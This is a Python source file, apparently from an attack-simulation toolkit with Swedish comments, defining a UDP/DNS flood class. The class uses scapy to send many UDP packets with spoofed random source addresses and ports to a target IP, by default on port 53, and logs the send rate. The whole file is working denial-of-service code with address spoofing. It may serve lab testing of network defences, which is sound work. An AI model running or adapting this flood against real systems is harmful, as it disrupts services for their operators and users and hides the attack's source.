"""
UDP Flood Attack
"""
from scapy.all import IP, UDP, Raw
import time
from datetime import datetime
from .base_attack import BaseAttack
from utils.network_utils import generate_random_ip, generate_random_port


class UDPAttack(BaseAttack):
    """UDP Flood med tydlig payload"""

    def get_attack_name(self):
        return "UDP/DNS Flood"

    def execute(self, count=100, port=53):
        """Kör UDP flood attack"""
        self.print_header("UDP Flood Attack", port=port, count=count)

        self.start_time = time.time()
        self.packets_sent = 0

        for i in range(count):
            fake_source = generate_random_ip()
            fake_sport = generate_random_port()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            payload = f"""
╔═══════════════════════════════════════════╗
║  {self.custom_message}
║  UDP Packet #{i+1}
║  Time: {timestamp}
║  From: {fake_source}:{fake_sport}
║  To: {self.target_ip}:{port}
╚═══════════════════════════════════════════╝
            """.encode()

            packet = IP(src=fake_source, dst=self.target_ip)/ \
                     UDP(sport=fake_sport, dport=port)/ \
                     Raw(load=payload)

            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] UDP: {i + 1}/{count} paket skickade ({pps:.1f} pps)")

        self.log_attack("UDP_FLOOD", f"Port {port}, {count} packets sent with message: {self.custom_message}")
        self.print_summary()
